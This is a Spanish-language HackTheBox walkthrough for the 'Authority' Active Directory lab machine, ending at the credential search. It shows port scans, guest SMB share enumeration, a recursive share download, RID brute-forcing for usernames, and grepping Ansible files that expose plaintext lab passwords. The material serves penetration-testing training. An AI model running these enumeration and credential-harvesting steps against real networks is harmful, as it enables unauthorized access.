---
title: "HackTheBox Machine - Authority"
date: 2026-02-11 20:00:00 -0600
categories: [Writeups, HachTheBox]
tags: [HTB Easy Machines, Active Directory, SeMachineAccountPrivilege, ESC1, nmap, dig, netexec, smbmap, smbclient, ansible2john, ansible-vault, evil-winrm-py, responder, certipy-ad, impacket-lookupsid, impacket-addcomputer, SMB, WirRM, HTTP, LDAP]
---


## TCP Scan

Empezaré escaneando puertos con `nmap` del puerto 1 al 65535.. 

```shell
❯ nmap -p 1-65535 -sS -n -Pn --min-rate 5000 10.129.12.201 -oN TCPPorts
Starting Nmap 7.98 ( <https://nmap.org> ) at 2025-12-22 12:28 -0600
Warning: 10.129.12.201 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.12.201
Host is up (0.10s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49702/tcp open  unknown
49710/tcp open  unknown
51693/tcp open  unknown
54876/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds
```

## Filtering Open Ports

Filtraré los puertos abiertos para facilitar la enumeración de servicios y versiones.

```shell
❯ grep "open" TCPPorts | cut -d ' ' -f1 | cut -d '/' -f1 | xargs | tr ' ' ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49693,49694,49702,49710,51693,54876
```

## TCP Services Scan

```shell
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49693,49694,49702,49710,51693,54876 -n -Pn --min-rate 5000 10.129.12.201 -oN TCPServices
Starting Nmap 7.98 ( <https://nmap.org> ) at 2025-12-22 12:31 -0600
Nmap scan report for 10.129.12.201
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-22 22:31:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-12-22T22:32:45+00:00; +4h00m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-12-22T22:32:44+00:00; +4h00m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-22T22:32:45+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-12-22T22:32:44+00:00; +4h00m03s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| tls-alpn: 
|_  h2
|_http-trane-info: Problem with XML parsing of /evox/about
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-12-20T22:24:33
|_Not valid after:  2027-12-23T10:02:57
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
51693/tcp open  msrpc         Microsoft Windows RPC
54876/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-22T22:32:34
|_  start_date: N/A
|_clock-skew: mean: 4h00m02s, deviation: 0s, median: 4h00m02s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 75.30 seconds
```

El escaneo arroja varios dominios: `authority.htb`, `authority.htb.corp` y `htb.corp` para agregarlos al **/etc/hosts**.

```shell
10.129.12.201 authority.htb authority.htb.corp htb.corp
```

## 53/TCP|UDP - DNS (Domain Name Server)

Probando transferencia de zona me devuelve una transferencia fallida.

```shell
❯ dig axfr @10.129.12.201 authority.htb.corp

; <<>> DiG 9.20.15-2-Debian <<>> axfr @10.129.12.201 authority.htb.corp
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

## 445/TCP - SMB (Server Message Block)

Al no contar con credenciales, suelo probar una credenciales de `Invitado (Guest)` o una `null session`.

```shell
❯ netexec smb authority.htb.corp -u guest -p ''
SMB         10.129.12.201   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.12.201   445    AUTHORITY        [+] authority.htb\\guest: 
```

### SMB Shares

Enumerando los compartidos se observa una carpeta inusual llamada “Development”.

```shell
❯ netexec smb authority.htb.corp -u guest -p '' --shares
SMB         10.129.12.201   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.12.201   445    AUTHORITY        [+] authority.htb\\guest: 
SMB         10.129.12.201   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.12.201   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.12.201   445    AUTHORITY        -----           -----------     ------
SMB         10.129.12.201   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.12.201   445    AUTHORITY        C$                              Default share
SMB         10.129.12.201   445    AUTHORITY        Department Shares                 
SMB         10.129.12.201   445    AUTHORITY        Development     READ            
SMB         10.129.12.201   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.12.201   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.12.201   445    AUTHORITY        SYSVOL                          Logon server share 
```
Igualmente se pueden enumerar los comparitos con `smbmap`.

```shell
❯ smbmap -H 10.129.229.56 -u guest -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\
  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)
   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/
    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /
   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\
  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     <https://github.com/ShawnDEvans/smbmap>

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.229.56:445	Name: 10.129.229.56       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
[*] Closed 1 connections
```


```shell
❯ smbclient \\\\\\\\authority.htb.corp\\\\Development -U "guest%"
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Fri Mar 17 07:20:38 2023
  ..                                  D        0  Fri Mar 17 07:20:38 2023
  Automation                          D        0  Fri Mar 17 07:20:40 2023

		5888511 blocks of size 4096. 1496587 blocks available
smb: \\> cd Automation
smb: \\Automation\\> ls
  .                                   D        0  Fri Mar 17 07:20:40 2023
  ..                                  D        0  Fri Mar 17 07:20:40 2023
  Ansible                             D        0  Fri Mar 17 07:20:50 2023

		5888511 blocks of size 4096. 1496587 blocks available
smb: \\Automation\\> cd Ansible
smb: \\Automation\\Ansible\\> ls
  .                                   D        0  Fri Mar 17 07:20:50 2023
  ..                                  D        0  Fri Mar 17 07:20:50 2023
  ADCS                                D        0  Fri Mar 17 07:20:48 2023
  LDAP                                D        0  Fri Mar 17 07:20:48 2023
  PWM                                 D        0  Fri Mar 17 07:20:48 2023
  SHARE                               D        0  Fri Mar 17 07:20:48 2023
```

### Download Recursively SMB Files

Indagando entre las carpetas, me doy cuenta que son muchos archivos, sin embargo, desde la consola de `smbclient` hay una manera de descargar todos los archivos recursivamente de un recurso compartido.

```shell
❯ smbclient \\\\\\\\authority.htb.corp\\\\Development -U "guest%"
Try "help" to get a list of possible commands.
smb: \\> mask ""
smb: \\> recurse ON
smb: \\> prompt OFF
smb: \\> cd .
smb: \\> lcd "/home/zyon/Documents/CTFs/HTB/Machines/Medium/Authority/more/smbshares"
smb: \\> mget *
getting file \\Automation\\Ansible\\ADCS\\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\.yamllint of size 205 as Automation/Ansible/ADCS/.yamllint (0.5 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\LICENSE of size 11364 as Automation/Ansible/ADCS/LICENSE (22.3 KiloBytes/sec) (average 9.1 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\README.md of size 7279 as Automation/Ansible/ADCS/README.md (17.7 KiloBytes/sec) (average 11.1 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\requirements.txt of size 466 as Automation/Ansible/ADCS/requirements.txt (1.1 KiloBytes/sec) (average 9.2 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\requirements.yml of size 264 as Automation/Ansible/ADCS/requirements.yml (0.6 KiloBytes/sec) (average 7.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\SECURITY.md of size 924 as Automation/Ansible/ADCS/SECURITY.md (2.3 KiloBytes/sec) (average 7.1 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\tox.ini of size 419 as Automation/Ansible/ADCS/tox.ini (1.1 KiloBytes/sec) (average 6.4 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\.travis.yml of size 1414 as Automation/Ansible/LDAP/.travis.yml (3.3 KiloBytes/sec) (average 6.0 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\README.md of size 5768 as Automation/Ansible/LDAP/README.md (13.9 KiloBytes/sec) (average 6.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\TODO.md of size 119 as Automation/Ansible/LDAP/TODO.md (0.3 KiloBytes/sec) (average 6.2 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\Vagrantfile of size 640 as Automation/Ansible/LDAP/Vagrantfile (1.6 KiloBytes/sec) (average 5.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\ansible.cfg of size 491 as Automation/Ansible/PWM/ansible.cfg (1.2 KiloBytes/sec) (average 5.5 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\ansible_inventory of size 174 as Automation/Ansible/PWM/ansible_inventory (0.4 KiloBytes/sec) (average 5.2 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\README.md of size 1290 as Automation/Ansible/PWM/README.md (3.1 KiloBytes/sec) (average 5.0 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\defaults\\main.yml of size 1578 as Automation/Ansible/ADCS/defaults/main.yml (3.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\meta\\main.yml of size 549 as Automation/Ansible/ADCS/meta/main.yml (1.4 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\meta\\preferences.yml of size 22 as Automation/Ansible/ADCS/meta/preferences.yml (0.1 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\tasks\\assert.yml of size 2936 as Automation/Ansible/ADCS/tasks/assert.yml (7.2 KiloBytes/sec) (average 4.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\tasks\\generate_ca_certs.yml of size 2262 as Automation/Ansible/ADCS/tasks/generate_ca_certs.yml (5.6 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\tasks\\init_ca.yml of size 1244 as Automation/Ansible/ADCS/tasks/init_ca.yml (3.1 KiloBytes/sec) (average 4.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\tasks\\main.yml of size 1359 as Automation/Ansible/ADCS/tasks/main.yml (2.9 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\tasks\\requests.yml of size 4214 as Automation/Ansible/ADCS/tasks/requests.yml (9.5 KiloBytes/sec) (average 4.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\templates\\extensions.cnf.j2 of size 1659 as Automation/Ansible/ADCS/templates/extensions.cnf.j2 (4.0 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\templates\\openssl.cnf.j2 of size 11294 as Automation/Ansible/ADCS/templates/openssl.cnf.j2 (27.0 KiloBytes/sec) (average 5.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\vars\\main.yml of size 2146 as Automation/Ansible/ADCS/vars/main.yml (3.5 KiloBytes/sec) (average 5.5 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\.bin\\clean_vault of size 677 as Automation/Ansible/LDAP/.bin/clean_vault (1.6 KiloBytes/sec) (average 5.4 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\.bin\\diff_vault of size 357 as Automation/Ansible/LDAP/.bin/diff_vault (0.9 KiloBytes/sec) (average 5.2 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\.bin\\smudge_vault of size 768 as Automation/Ansible/LDAP/.bin/smudge_vault (1.9 KiloBytes/sec) (average 5.1 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\defaults\\main.yml of size 1046 as Automation/Ansible/LDAP/defaults/main.yml (2.6 KiloBytes/sec) (average 5.0 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\files\\pam_mkhomedir of size 170 as Automation/Ansible/LDAP/files/pam_mkhomedir (0.4 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\handlers\\main.yml of size 277 as Automation/Ansible/LDAP/handlers/main.yml (0.7 KiloBytes/sec) (average 4.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\meta\\main.yml of size 416 as Automation/Ansible/LDAP/meta/main.yml (1.1 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\tasks\\main.yml of size 5235 as Automation/Ansible/LDAP/tasks/main.yml (12.7 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\templates\\ldap_sudo_groups.j2 of size 131 as Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2 (0.3 KiloBytes/sec) (average 4.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\templates\\ldap_sudo_users.j2 of size 106 as Automation/Ansible/LDAP/templates/ldap_sudo_users.j2 (0.1 KiloBytes/sec) (average 4.3 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\templates\\sssd.conf.j2 of size 2556 as Automation/Ansible/LDAP/templates/sssd.conf.j2 (4.5 KiloBytes/sec) (average 4.3 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\templates\\sudo_group.j2 of size 30 as Automation/Ansible/LDAP/templates/sudo_group.j2 (0.1 KiloBytes/sec) (average 4.2 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\vars\\debian.yml of size 174 as Automation/Ansible/LDAP/vars/debian.yml (0.4 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\vars\\main.yml of size 75 as Automation/Ansible/LDAP/vars/main.yml (0.2 KiloBytes/sec) (average 4.0 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\vars\\redhat.yml of size 222 as Automation/Ansible/LDAP/vars/redhat.yml (0.5 KiloBytes/sec) (average 3.9 KiloBytes/sec)
getting file \\Automation\\Ansible\\LDAP\\vars\\ubuntu-14.04.yml of size 203 as Automation/Ansible/LDAP/vars/ubuntu-14.04.yml (0.5 KiloBytes/sec) (average 3.9 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\defaults\\main.yml of size 1591 as Automation/Ansible/PWM/defaults/main.yml (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\handlers\\main.yml of size 4 as Automation/Ansible/PWM/handlers/main.yml (0.0 KiloBytes/sec) (average 3.8 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\meta\\main.yml of size 199 as Automation/Ansible/PWM/meta/main.yml (0.5 KiloBytes/sec) (average 3.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\tasks\\main.yml of size 1832 as Automation/Ansible/PWM/tasks/main.yml (4.4 KiloBytes/sec) (average 3.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\templates\\context.xml.j2 of size 422 as Automation/Ansible/PWM/templates/context.xml.j2 (1.0 KiloBytes/sec) (average 3.7 KiloBytes/sec)
getting file \\Automation\\Ansible\\PWM\\templates\\tomcat-users.xml.j2 of size 388 as Automation/Ansible/PWM/templates/tomcat-users.xml.j2 (1.0 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\SHARE\\tasks\\main.yml of size 1876 as Automation/Ansible/SHARE/tasks/main.yml (4.5 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\molecule\\default\\converge.yml of size 106 as Automation/Ansible/ADCS/molecule/default/converge.yml (0.3 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\molecule\\default\\molecule.yml of size 526 as Automation/Ansible/ADCS/molecule/default/molecule.yml (1.3 KiloBytes/sec) (average 3.5 KiloBytes/sec)
getting file \\Automation\\Ansible\\ADCS\\molecule\\default\\prepare.yml of size 371 as Automation/Ansible/ADCS/molecule/default/prepare.yml (0.9 KiloBytes/sec) (average 3.5 KiloBytes/sec)
```

## RID Cycling Attack

Antes de continuar, quiero conocer los usuarios locales de la máquina, efectuando un `RID Cycling Attack` puedo listar RIDs y usuarios, y posteriormente almacenarlos en un diccionario `users`.

```shell
❯ netexec smb authority.htb.corp -u guest -p '' --rid-brute
SMB         10.129.12.201   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.12.201   445    AUTHORITY        [+] authority.htb\\guest: 
SMB         10.129.12.201   445    AUTHORITY        498: HTB\\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        500: HTB\\Administrator (SidTypeUser)
SMB         10.129.12.201   445    AUTHORITY        501: HTB\\Guest (SidTypeUser)
SMB         10.129.12.201   445    AUTHORITY        502: HTB\\krbtgt (SidTypeUser)
SMB         10.129.12.201   445    AUTHORITY        512: HTB\\Domain Admins (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        513: HTB\\Domain Users (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        514: HTB\\Domain Guests (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        515: HTB\\Domain Computers (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        516: HTB\\Domain Controllers (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        517: HTB\\Cert Publishers (SidTypeAlias)
SMB         10.129.12.201   445    AUTHORITY        518: HTB\\Schema Admins (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        519: HTB\\Enterprise Admins (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        520: HTB\\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        521: HTB\\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        522: HTB\\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        525: HTB\\Protected Users (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        526: HTB\\Key Admins (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        527: HTB\\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        553: HTB\\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.12.201   445    AUTHORITY        571: HTB\\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.12.201   445    AUTHORITY        572: HTB\\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.12.201   445    AUTHORITY        1000: HTB\\AUTHORITY$ (SidTypeUser)
SMB         10.129.12.201   445    AUTHORITY        1101: HTB\\DnsAdmins (SidTypeAlias)
SMB         10.129.12.201   445    AUTHORITY        1102: HTB\\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.12.201   445    AUTHORITY        1601: HTB\\svc_ldap (SidTypeUser)

❯ grep "SidTypeUser" sidusers | tr -s ' ' | cut -d ' ' -f6 | cut -d '\\' -f2
Administrator
Guest
krbtgt
AUTHORITY$
svc_ldap

❯ grep "SidTypeUser" sidusers | tr -s ' ' | cut -d ' ' -f6 | cut -d '\\' -f2 > users
```

## Looking for Credentials

Teniendo que revisar muchos archivos, filtro por palabras clave que me lleven hacia una credendial almacenada.

```shell
❯ grep -Eir "pass|password|ansible|cred"

Ansible/PWM/defaults/main.yml:pwm_admin_password: !vault |
Ansible/PWM/defaults/main.yml:ldap_admin_password: !vault |
Ansible/PWM/README.md:- pwm_root_mysql_password: root mysql password, will be set to a random value by default.
Ansible/PWM/README.md:- pwm_pwm_mysql_password: pwm mysql password, will be set to a random value by default.
Ansible/PWM/README.md:- pwm_admin_password: pwm admin password, 'password' by default.
Ansible/PWM/ansible_inventory:ansible_password: Welcome1
Ansible/PWM/templates/tomcat-users.xml.j2:<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
Ansible/PWM/templates/tomcat-users.xml.j2:<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
Ansible/ADCS/tox.ini:passenv = namespace image tag DOCKER_HOST
Ansible/ADCS/tasks/generate_ca_certs.yml:    privatekey_passphrase: "\{\{ ca_passphrase \}\}"
Ansible/ADCS/tasks/generate_ca_certs.yml:    privatekey_passphrase: "\{\{ ca_passphrase \}\}"
Ansible/ADCS/tasks/assert.yml:- name: Test if ca_passphrase is set correctly
Ansible/ADCS/tasks/assert.yml:      - ca_passphrase is defined
Ansible/ADCS/tasks/assert.yml:      - ca_passphrase is string
Ansible/ADCS/tasks/requests.yml:        - name: Generate requested key (passphrase set)
Ansible/ADCS/tasks/requests.yml:            passphrase: "\{\{ request.passphrase \}\}"
Ansible/ADCS/tasks/requests.yml:            - request.passphrase is defined
Ansible/ADCS/tasks/requests.yml:        - name: Generate requested key (passphrase not set)
Ansible/ADCS/tasks/requests.yml:            - request.passphrase is not defined
Ansible/ADCS/tasks/requests.yml:        privatekey_passphrase: "\{\{ request.passphrase | default(omit) \}\}"
Ansible/ADCS/tasks/init_ca.yml:    passphrase: "\{\{ ca_passphrase \}\}"
Ansible/ADCS/defaults/main.yml:# A passphrase for the CA key.
Ansible/ADCS/defaults/main.yml:ca_passphrase: SuP3rS3creT
Ansible/ADCS/defaults/main.yml:#     passphrase: S3creT
Ansible/ADCS/defaults/main.yml:#     passphrase: S3creT
Ansible/ADCS/vars/main.yml:  -config \{\{ ca_openssl_config_file \}\} -key \{\{ ca_passphrase \}\}
Ansible/ADCS/vars/main.yml:  -config \{\{ ca_openssl_config_file \}\} -key \{\{ ca_passphrase \}\}
Ansible/ADCS/vars/main.yml:  -config \{\{ ca_openssl_config_file \}\} -key \{\{ ca_passphrase \}\}
Ansible/ADCS/vars/main.yml:  -config \{\{ ca_openssl_config_file \}\} -key \{\{ ca_passphrase \\}}
Ansible/ADCS/vars/main.yml:  -config \{\{ ca_openssl_config_file \}\} -key \{\{ ca_passphrase \}\}
Ansible/ADCS/README.md:# A passphrase for the CA key.
Ansible/ADCS/README.md:ca_passphrase: SuP3rS3creT
Ansible/ADCS/README.md:#     passphrase: S3creT
Ansible/ADCS/README.md:#     passphrase: S3creT
Ansible/ADCS/templates/openssl.cnf.j2:preserve	= no			# keep passed DN ordering
Ansible/ADCS/templates/openssl.cnf.j2:# Passwords for private keys if not present they will be prompted for
Ansible/ADCS/templates/openssl.cnf.j2:# input_password = secret
Ansible/ADCS/templates/openssl.cnf.j2:# output_password = secret
Ansible/ADCS/templates/openssl.cnf.j2:challengePassword		= A challenge password
Ansible/ADCS/templates/openssl.cnf.j2:challengePassword_min		= 4
Ansible/ADCS/templates/openssl.cnf.j2:challengePassword_max		= 20
Ansible/LDAP/tasks/main.yml:    - passwd
Ansible/LDAP/tasks/main.yml:- name: Query SSSD in pam.d/password-auth
Ansible/LDAP/tasks/main.yml:    dest: /etc/pam.d/password-auth
Ansible/LDAP/tasks/main.yml:        line: "auth        sufficient    pam_sss.so use_first_pass" \}
Ansible/LDAP/tasks/main.yml:    - \{ before: "^password.*pam_deny.so",
Ansible/LDAP/tasks/main.yml:        regexp: "^password.*pam_sss.so",
Ansible/LDAP/tasks/main.yml:        line: "password    sufficient    pam_sss.so use_authtok" }
Ansible/LDAP/tasks/main.yml:        line: "auth        sufficient    pam_sss.so use_first_pass" \}
Ansible/LDAP/tasks/main.yml:    - \{ before: "^password.*pam_deny.so",
Ansible/LDAP/tasks/main.yml:        regexp: "^password.*pam_sss.so",
Ansible/LDAP/tasks/main.yml:        line: "password    sufficient    pam_sss.so use_authtok" \}
Ansible/LDAP/tasks/main.yml:- name: Allow/Disallow password authentication in SSHD config for users
Ansible/LDAP/tasks/main.yml:      PasswordAuthentication yes
Ansible/LDAP/tasks/main.yml:    state: "\{\{ 'present' if system_ldap_allow_passwordauth_in_sshd and system_ldap_access_filter_users else 'absent' \}\}"
Ansible/LDAP/tasks/main.yml:- name: Allow/Disallow password authentication in SSHD config for groups
Ansible/LDAP/tasks/main.yml:      PasswordAuthentication yes
Ansible/LDAP/tasks/main.yml:    state: "\{\{ 'present' if system_ldap_allow_passwordauth_in_sshd and system_ldap_access_unix_groups else 'absent' \}\}"
Ansible/LDAP/defaults/main.yml:system_ldap_allow_passwordauth_in_sshd: false
Ansible/LDAP/defaults/main.yml:system_ldap_bind_password:
Ansible/LDAP/README.md:|`system_ldap_bind_password`|`sunrise`|The authentication token of the default bind DN. Only clear text passwords are currently supported.|
